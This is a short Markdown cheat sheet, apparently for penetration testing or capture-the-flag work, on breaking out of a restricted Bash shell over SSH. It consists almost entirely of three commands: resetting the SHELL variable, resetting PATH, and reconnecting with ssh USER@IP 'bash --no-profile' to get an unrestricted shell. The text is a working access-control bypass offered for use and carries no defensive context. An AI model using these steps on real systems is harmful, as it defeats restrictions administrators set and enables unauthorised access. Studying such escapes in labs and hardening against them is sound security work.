# Breaking out of restricted Bash CLI in SSH

## requirements: can run export

### 1) 

    export SHELL=/bin/bash

### 2) 

    export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

### 3) 

    ssh USER@IP 'bash --no-profile'
